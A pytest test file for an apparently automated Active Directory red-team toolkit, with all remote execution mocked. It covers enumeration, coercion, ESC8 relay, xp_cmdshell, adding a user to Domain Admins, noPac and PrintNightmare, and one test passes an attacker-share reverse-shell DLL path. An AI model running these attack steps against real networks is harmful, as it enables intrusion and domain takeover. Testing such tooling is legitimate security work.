"""Tests for red team network penetration testing tools."""

from datetime import datetime, timezone
from unittest.mock import patch

import pytest

from ares.core.models import (
    InvestigationStage,
    RedTeamState,
    Target,
)


class MockRunResult:
    """Mock result for run_remote function."""

    def __init__(self, stdout: str = "", stderr: str = "", return_code: int = 0):
        self.stdout = stdout
        self.stderr = stderr
        self.return_code = return_code


@pytest.fixture
def red_team_state() -> RedTeamState:
    """Create a basic red team state for testing."""
    return RedTeamState(
        operation_id="op-test-001",
        target=Target(ip="192.168.56.100", hostname="dc01", domain="test.local"),
        started_at=datetime.now(timezone.utc),
        stage=InvestigationStage.TRIAGE,
        hosts=[],
        users=[],
        credentials=[],
        hashes=[],
        shares=[],
        weaknesses=[],
        timeline=[],
        identified_techniques=set(),
        has_domain_admin=False,
        has_golden_ticket=False,
        report_summary=None,
    )


class TestRunToolFunction:
    """Tests for _run_tool helper function."""

    def test_run_tool_success(self):
        """Test successful command execution."""
        from ares.tools.red.network import _run_tool

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="output", stderr="", return_code=0)
            stdout, stderr, code = _run_tool(["echo", "test"])

        assert stdout == "output"
        assert stderr == ""
        assert code == 0

    def test_run_tool_failure(self):
        """Test failed command execution."""
        from ares.tools.red.network import _run_tool

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="", stderr="error", return_code=1)
            _stdout, stderr, code = _run_tool(["invalid", "command"])

        assert stderr == "error"
        assert code == 1

    def test_run_tool_passes_target_role(self):
        """Test target_role forwarding to remote executor."""
        from ares.tools.red.network import _run_tool

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="ok", stderr="", return_code=0)
            _run_tool(["whoami"], target_role="lateral")

        mock_run.assert_called_once_with(
            ["whoami"],
            timeout_seconds=300,
            target_role="lateral",
        )


class TestNetworkEnumerationTools:
    """Tests for NetworkEnumerationTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_extract_users_from_netexec_users_backslash_format(self):
        """Test parsing netexec --users output with backslash usernames."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        outputs = [
            (
                "netexec smb --users",
                "SMB 192.168.56.1 445 DC [*] ACME\\jdoe (SidTypeUser)\n",
            )
        ]

        users = tools._extract_users_from_outputs(outputs)

        assert "jdoe" in users

    def test_extract_users_from_netexec_rid_brute_backslash_format(self):
        """Test parsing netexec --rid-brute output with backslash usernames."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        outputs = [
            (
                "netexec smb --rid-brute",
                "SMB 192.168.56.1 445 DC ACME\\svc_account (SidTypeUser)\n",
            )
        ]

        users = tools._extract_users_from_outputs(outputs)

        assert "svc_account" in users

    def test_nmap_scan_success(self, red_team_state: RedTeamState):
        """Test successful nmap scan."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="PORT   STATE SERVICE\n22/tcp open  ssh\n",
                stderr="",
                return_code=0,
            )
            result = tools.nmap_scan("192.168.56.100")

        assert "PORT" in result
        assert "22/tcp" in result
        assert "192.168.56.100" in red_team_state.queried_hosts

    def test_nmap_scan_failure(self, red_team_state: RedTeamState):
        """Test nmap scan failure."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="", stderr="Host unreachable", return_code=1
            )
            result = tools.nmap_scan("192.168.56.100")

        assert "unreachable" in result.lower() or "failed" in result.lower()

    def test_nmap_scan_exception(self, red_team_state: RedTeamState):
        """Test nmap scan handles exceptions."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Connection error")
            result = tools.nmap_scan("192.168.56.100")

        assert "failed" in result.lower()

    def test_nmap_scan_multiple_targets(self, red_team_state: RedTeamState):
        """Test nmap scan with multiple targets."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="Scan complete", return_code=0)
            tools.nmap_scan("192.168.56.100 192.168.56.101")

        # Both hosts should be tracked
        assert "192.168.56.100" in red_team_state.queried_hosts
        assert "192.168.56.101" in red_team_state.queried_hosts

    def test_enumerate_users_success(self, red_team_state: RedTeamState):
        """Test successful user enumeration."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Administrator\nuser1\nuser2", return_code=0
            )
            result = tools.enumerate_users(
                target="192.168.56.100",
                username="admin",
                password="pass",  # pragma: allowlist secret
                domain="TEST",
            )

        assert "Administrator" in result

    def test_enumerate_users_null_session(self, red_team_state: RedTeamState):
        """Test user enumeration with null session using GOAD-like output."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        netexec_users = (
            "SMB                      192.168.56.9        445    HQ-DC            "
            "[*] Windows 10 / Server 2019 Build 17763 x64 (name:HQ-DC) "
            "(domain:marketing.bigco.com) (signing:True) (SMBv1:None) (Null Auth:True)\n"
        )
        lsaquery_output = (
            "Domain Name: MARKETING\nDomain Sid: S-1-5-21-1111111111-2222222222-3333333333\n"
        )
        access_denied = "result was NT_STATUS_ACCESS_DENIED\n"
        nmap_445 = (
            "Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 17:43 +0000\n"
            "Nmap scan report for ip-10-0-9-9.us-west-2.compute.internal (192.168.56.9)\n"
            "Host is up.\n\n"
            "PORT    STATE    SERVICE\n"
            "445/tcp filtered microsoft-ds\n\n"
            "Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds\n"
        )
        rid_brute = (
            "SMB                      192.168.56.9        445    HQ-DC            "
            "[*] Windows 10 / Server 2019 Build 17763 x64 (name:HQ-DC) "
            "(domain:marketing.bigco.com) (signing:True) (SMBv1:None) (Null Auth:True)\n"
            "SMB                      192.168.56.9        445    HQ-DC            "
            "[+] marketing.bigco.com\\:\n"
            "SMB                      192.168.56.9        445    HQ-DC            "
            "[-] Error connecting: LSAD SessionError: code: 0xc0000022 - "
            "STATUS_ACCESS_DENIED - {Access Denied} A process has requested access "
            "to an object but has not been granted those access rights.\n"
        )
        kerb_noauth = (
            "Impacket v0.13.0.dev0+20251022.125034.d843881f - Copyright Fortra, LLC "
            "and its affiliated companies\n\n"
            "[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set\n"
        )

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = [
                MockRunResult(stdout=netexec_users, return_code=0),
                MockRunResult(stdout=lsaquery_output, return_code=0),
                MockRunResult(stdout=access_denied, return_code=1),
                MockRunResult(stdout=access_denied, return_code=1),
                MockRunResult(stdout=access_denied, return_code=1),
                MockRunResult(stdout=nmap_445, return_code=0),
                MockRunResult(stdout=nmap_445, return_code=0),
                MockRunResult(stdout=rid_brute, return_code=0),
                MockRunResult(stdout=kerb_noauth, return_code=0),
            ]
            result = tools.enumerate_users(target="192.168.56.100", username="", password="")

        assert "SMB user enumeration did not return users" in result
        assert "445 filtered" in result
        assert "access denied" in result.lower()
        assert mock_run.call_count == 10


class TestCertipyRelayEsc8:
    """Tests for CertipyTools.certipy_relay_esc8 behavior."""

    def test_certipy_relay_esc8_coerce_no_auth(self):
        """Coercion path returns warning when relay sees no auth."""
        from ares.tools.red.network import CertipyTools

        tools = CertipyTools()

        with (
            patch("ares.tools.red.network._infer_listener_ip") as mock_infer,
            patch("ares.tools.red.network._run_tool") as mock_run,
        ):
            mock_infer.return_value = "10.0.0.5"
            mock_run.return_value = ("empty output", "", 0)

            result = tools.certipy_relay_esc8(
                ca_host="ca.test.local",
                coerce_target="dc.test.local",
                coerce_method="petitpotam",
                relay_timeout_seconds=123,
            )

        assert "NO AUTH RECEIVED" in result
        assert "Coercion fired: petitpotam" in result
        assert "Listener: 10.0.0.5" in result

        mock_run.assert_called_once()
        cmd = mock_run.call_args.args[0]
        assert cmd[:2] == ["bash", "-lc"]
        assert mock_run.call_args.kwargs["timeout_seconds"] == 50
        assert "timeout 123s" in cmd[2]
        assert "timeout 20s petitpotam.py 10.0.0.5 dc.test.local" in cmd[2]

    def test_certipy_relay_esc8_coerce_auth_seen(self):
        """Coercion path returns success when relay sees auth."""
        from ares.tools.red.network import CertipyTools

        tools = CertipyTools()

        with (
            patch("ares.tools.red.network._infer_listener_ip") as mock_infer,
            patch("ares.tools.red.network._run_tool") as mock_run,
        ):
            mock_infer.return_value = "10.0.0.6"
            mock_run.return_value = ("NTLM relay connection", "", 0)

            result = tools.certipy_relay_esc8(
                ca_host="ca.test.local",
                coerce_target="dc.test.local",
                coerce_method="coercer",
                relay_timeout_seconds=90,
            )

        assert "ESC8 RELAY + COERCION" in result
        assert "Coercion: coercer against dc.test.local" in result
        assert "Listener: 10.0.0.6" in result

    def test_certipy_relay_esc8_coerce_missing_listener(self):
        """Coercion path fails fast when listener cannot be inferred."""
        from ares.tools.red.network import CertipyTools

        tools = CertipyTools()

        with (
            patch("ares.tools.red.network._infer_listener_ip") as mock_infer,
            patch("ares.tools.red.network._run_tool") as mock_run,
        ):
            mock_infer.return_value = None
            result = tools.certipy_relay_esc8(
                ca_host="ca.test.local",
                coerce_target="dc.test.local",
            )

        assert "listener IP could not be determined" in result
        mock_run.assert_not_called()

    def test_certipy_relay_esc8_noncoerce_env_timeout(self, monkeypatch: pytest.MonkeyPatch):
        """Non-coercion path respects env timeout and reports auth seen."""
        from ares.tools.red.network import CertipyTools

        tools = CertipyTools()
        monkeypatch.setenv("ARES_ESC8_RELAY_TIMEOUT", "321")

        with (
            patch("ares.tools.red.network._infer_listener_ip") as mock_infer,
            patch("ares.tools.red.network._run_tool") as mock_run,
        ):
            mock_infer.return_value = "10.0.0.9"
            mock_run.return_value = ("NTLM relay success", "", 0)

            result = tools.certipy_relay_esc8(
                ca_host="ca.test.local",
                template_name="DomainController",
            )

        assert "ESC8 RELAY SETUP" in result
        assert "Listener: 10.0.0.9" in result
        assert "Auth seen: yes" in result
        mock_run.assert_called_once()
        assert mock_run.call_args.kwargs["timeout_seconds"] == 321

    def test_enumerate_users_exception(self, red_team_state: RedTeamState):
        """Test user enumeration handles exceptions."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Auth failed")
            result = tools.enumerate_users(
                target="192.168.56.100",
                username="user",
                password="wrong",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()

    def test_enumerate_shares_success(self, red_team_state: RedTeamState):
        """Test successful share enumeration."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="ADMIN$ READ,WRITE\nC$ READ\nSHARE1 READ", return_code=0
            )
            result = tools.enumerate_shares(
                target="192.168.56.100",
                domain="TEST",
                username="admin",
                password="pass",  # pragma: allowlist secret
            )

        assert "ADMIN$" in result or "SHARE1" in result

    def test_enumerate_shares_exception(self, red_team_state: RedTeamState):
        """Test share enumeration handles exceptions."""
        from ares.tools.red.network import NetworkEnumerationTools

        tools = NetworkEnumerationTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Connection refused")
            result = tools.enumerate_shares(
                target="192.168.56.100",
                username="user",
                password="pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()


class TestCredentialHarvestingTools:
    """Tests for CredentialHarvestingTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_kerberos_user_enum_noauth_goad(self, red_team_state: RedTeamState):
        """Test Kerberos no-auth user enumeration using GOAD-like output."""
        from ares.tools.red.network import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        tools.set_state(red_team_state)

        getnpusers_output = (
            "Impacket v0.13.0.dev0+20251022.125034.d843881f - Copyright Fortra, LLC "
            "and its affiliated companies\n\n"
            "[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set\n"
            "[-] User jane.doe doesn't have UF_DONT_REQUIRE_PREAUTH set\n"
            "[-] User bob.smith doesn't have UF_DONT_REQUIRE_PREAUTH set\n"
        )

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout=getnpusers_output, return_code=0)
            result = tools.kerberos_user_enum_noauth(
                domain="marketing.bigco.com",
                dc_ip="192.168.56.9",
                users_file="",
            )

        assert "✓ Valid principals" in result
        assert "admin" in result
        assert "jane.doe" in result
        assert "bob.smith" in result
        assert any(user.username == "admin" for user in red_team_state.users)

    def test_check_smb_connectivity_success(self, red_team_state: RedTeamState):
        """Test SMB connectivity check success."""
        from ares.tools.red.network import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="open", return_code=0)
            success, _msg = tools._check_smb_connectivity("192.168.56.100")

        assert success is True

    def test_check_smb_connectivity_failure(self, red_team_state: RedTeamState):
        """Test SMB connectivity check failure."""
        from ares.tools.red.network import CredentialHarvestingTools

        tools = CredentialHarvestingTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="closed", return_code=1)
            success, _msg = tools._check_smb_connectivity("192.168.56.100")

        assert success is False


class TestCrackingTools:
    """Tests for CrackingTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import CrackingTools

        tools = CrackingTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import CrackingTools

        tools = CrackingTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestSharePilferingTools:
    """Tests for SharePilferingTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import SharePilferingTools

        tools = SharePilferingTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import SharePilferingTools

        tools = SharePilferingTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestGoldenTicketTools:
    """Tests for GoldenTicketTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import GoldenTicketTools

        tools = GoldenTicketTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import GoldenTicketTools

        tools = GoldenTicketTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestBloodHoundTools:
    """Tests for BloodHoundTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import BloodHoundTools

        tools = BloodHoundTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import BloodHoundTools

        tools = BloodHoundTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestCertipyTools:
    """Tests for CertipyTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import CertipyTools

        tools = CertipyTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import CertipyTools

        tools = CertipyTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestDelegationTools:
    """Tests for DelegationTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import DelegationTools

        tools = DelegationTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import DelegationTools

        tools = DelegationTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state


class TestRedTeamReportingTools:
    """Tests for RedTeamReportingTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import RedTeamReportingTools

        tools = RedTeamReportingTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import RedTeamReportingTools

        tools = RedTeamReportingTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_record_finding_requires_data_payload(self, red_team_state: RedTeamState):
        """Test record_finding returns error when data payload is missing."""
        from ares.tools.red.network import RedTeamReportingTools

        tools = RedTeamReportingTools()
        tools.set_state(red_team_state)

        result = tools.record_finding("credential_reuse", None)

        assert "requires a data payload" in result.lower()


class TestCoercionTools:
    """Tests for CoercionTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_petitpotam_unauthenticated(self, red_team_state: RedTeamState):
        """Test PetitPotam unauthenticated coercion."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Successfully coerced authentication", return_code=0
            )
            result = tools.petitpotam("192.168.56.10", "192.168.56.100")

        assert "success" in result.lower()
        mock_run.assert_called_once()

    def test_petitpotam_authenticated(self, red_team_state: RedTeamState):
        """Test PetitPotam authenticated coercion."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="Successfully coerced", return_code=0)
            result = tools.petitpotam(
                "192.168.56.10",
                "192.168.56.100",
                username="user",
                password="pass",  # pragma: allowlist secret
                domain="test.local",
            )

        assert "success" in result.lower()

    def test_petitpotam_failure(self, red_team_state: RedTeamState):
        """Test PetitPotam failure handling."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Connection refused")
            result = tools.petitpotam("192.168.56.10", "192.168.56.100")

        assert "failed" in result.lower()

    def test_coercer_success(self, red_team_state: RedTeamState):
        """Test Coercer tool success."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Triggered authentication via MS-EFSRPC", return_code=0
            )
            result = tools.coercer(
                "192.168.56.10",
                "192.168.56.100",
                "user",
                "pass",  # pragma: allowlist secret
                "test.local",
            )

        assert "triggered" in result.lower()

    def test_coercer_exception(self, red_team_state: RedTeamState):
        """Test Coercer exception handling."""
        from ares.tools.red.network import CoercionTools

        tools = CoercionTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Timeout")
            result = tools.coercer(
                "192.168.56.10",
                "192.168.56.100",
                "user",
                "pass",  # pragma: allowlist secret
                "test.local",
            )

        assert "failed" in result.lower()


class TestMSSQLTools:
    """Tests for MSSQLTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import MSSQLTools

        tools = MSSQLTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_mssql_login_success(self, red_team_state: RedTeamState):
        """Test MSSQL login success."""
        from ares.tools.red.network import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="master\ntempdb\nIMPERSONATE permission found", return_code=0
            )
            result = tools.mssql_login(
                "192.168.56.22",
                "user",
                "pass",  # pragma: allowlist secret
                domain="test.local",
            )

        assert "impersonate" in result.lower()

    def test_mssql_login_exception(self, red_team_state: RedTeamState):
        """Test MSSQL login exception handling."""
        from ares.tools.red.network import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Connection refused")
            result = tools.mssql_login(
                "192.168.56.22",
                "user",
                "pass",  # pragma: allowlist secret
            )

        assert "failed" in result.lower()

    def test_mssql_xp_cmdshell_success(self, red_team_state: RedTeamState):
        """Test xp_cmdshell command execution."""
        from ares.tools.red.network import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="nt authority\\system", return_code=0)
            result = tools.mssql_xp_cmdshell(
                "192.168.56.22",
                "user",
                "pass",  # pragma: allowlist secret
                "whoami",
                domain="test.local",
                impersonate="sa",
            )

        assert "system" in result.lower()

    def test_mssql_xp_cmdshell_exception(self, red_team_state: RedTeamState):
        """Test xp_cmdshell exception handling."""
        from ares.tools.red.network import MSSQLTools

        tools = MSSQLTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Access denied")
            result = tools.mssql_xp_cmdshell(
                "192.168.56.22",
                "user",
                "pass",  # pragma: allowlist secret
                "whoami",
            )

        assert "failed" in result.lower()


class TestACLExploitTools:
    """Tests for ACLExploitTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_pywhisker_add_success(self, red_team_state: RedTeamState):
        """Test pywhisker shadow credentials success."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Shadow credentials saved to admin.pfx", return_code=0
            )
            result = tools.pywhisker(
                "Administrator",
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
            )

        assert ".pfx" in result.lower() or "shadow" in result.lower()

    def test_pywhisker_exception(self, red_team_state: RedTeamState):
        """Test pywhisker exception handling."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Access denied")
            result = tools.pywhisker(
                "Administrator",
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
            )

        assert "failed" in result.lower()

    def test_bloodyad_add_group_member_success(self, red_team_state: RedTeamState):
        """Test bloodyAD group member addition."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Successfully added user to Domain Admins", return_code=0
            )
            result = tools.bloodyad_add_group_member(
                "controlled_user",
                "Domain Admins",
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
            )

        assert "added" in result.lower() or "success" in result.lower()

    def test_bloodyad_add_group_member_exception(self, red_team_state: RedTeamState):
        """Test bloodyAD group member exception handling."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Insufficient rights")
            result = tools.bloodyad_add_group_member(
                "user",
                "Domain Admins",
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
            )

        assert "failed" in result.lower()

    def test_bloodyad_set_password_success(self, red_team_state: RedTeamState):
        """Test bloodyAD password reset."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Password changed successfully", return_code=0
            )
            result = tools.bloodyad_set_password(
                "target_user",
                "NewP@ss123!",  # pragma: allowlist secret
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
            )

        assert "reset" in result.lower() or "changed" in result.lower()

    def test_bloodyad_set_password_exception(self, red_team_state: RedTeamState):
        """Test bloodyAD password reset exception handling."""
        from ares.tools.red.network import ACLExploitTools

        tools = ACLExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Access denied")
            result = tools.bloodyad_set_password(
                "target_user",
                "NewP@ss123!",  # pragma: allowlist secret
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
            )

        assert "failed" in result.lower()


class TestCVEExploitTools:
    """Tests for CVEExploitTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import CVEExploitTools

        tools = CVEExploitTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_nopac_success(self, red_team_state: RedTeamState):
        """Test noPac exploitation success."""
        from ares.tools.red.network import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Administrator hash: aad3b435b51404eeaad3b435b51404ee",
                return_code=0,
            )
            result = tools.nopac(
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
                "DC01",
            )

        assert "hash" in result.lower() or "admin" in result.lower()

    def test_nopac_exception(self, red_team_state: RedTeamState):
        """Test noPac exception handling."""
        from ares.tools.red.network import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Target patched")
            result = tools.nopac(
                "test.local",
                "user",
                "pass",  # pragma: allowlist secret
                "192.168.56.10",
                "DC01",
            )

        assert "failed" in result.lower()

    def test_printnightmare_success(self, red_team_state: RedTeamState):
        """Test PrintNightmare exploitation."""
        from ares.tools.red.network import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="DLL executed successfully", return_code=0)
            result = tools.printnightmare(
                "192.168.56.22",
                "user",
                "pass",  # pragma: allowlist secret
                "test.local",
                "\\\\attacker\\share\\rev.dll",
            )

        assert "success" in result.lower() or "executed" in result.lower()

    def test_printnightmare_exception(self, red_team_state: RedTeamState):
        """Test PrintNightmare exception handling."""
        from ares.tools.red.network import CVEExploitTools

        tools = CVEExploitTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.side_effect = Exception("Spooler disabled")
            result = tools.printnightmare(
                "192.168.56.22",
                "user",
                "pass",  # pragma: allowlist secret
                "test.local",
                "\\\\attacker\\share\\rev.dll",
            )

        assert "failed" in result.lower()


class TestTrustAttackTools:
    """Tests for TrustAttackTools class."""

    def test_init(self):
        """Test initialization."""
        from ares.tools.red.network import TrustAttackTools

        tools = TrustAttackTools()
        assert tools.state is None

    def test_set_state(self, red_team_state: RedTeamState):
        """Test setting state."""
        from ares.tools.red.network import TrustAttackTools

        tools = TrustAttackTools()
        tools.set_state(red_team_state)
        assert tools.state == red_team_state

    def test_raise_child_success(self, red_team_state: RedTeamState):
        """Test raise_child domain escalation."""
        from ares.tools.red.network import TrustAttackTools

        tools = TrustAttackTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(
                stdout="Enterprise Admin golden ticket created", return_code=0
            )
            result = tools.raise_child(
                "child.test.local",
                "administrator",
                "pass",  # pragma: allowlist secret
            )

        assert "enterprise admin" in result.lower() or "golden ticket" in result.lower()

    def test_raise_child_with_target_domain(self, red_team_state: RedTeamState):
        """Test raise_child with explicit target domain."""
        from ares.tools.red.network import TrustAttackTools

        tools = TrustAttackTools()
        tools.set_state(red_team_state)

        with patch("ares.tools.red.network.run_remote") as mock_run:
            mock_run.return_value = MockRunResult(stdout="Escalation successful", return_code=0)
            result = tools.raise_child(
                "child.test.local",
                "administrator",
                "pass",  # pragma: allowlist secret
                target_domain="test.local",
            )

        assert "success" in result.lower() or "escalation" in result.lower()

    def test_raise_child_exception(self, red_team_state: RedTeamState):
        """Test raise_child exception handling."""
        from ares.tools.red.network import TrustAttackTools

        tools = TrustAttackTools()
        tools.set_state(red_team_state)

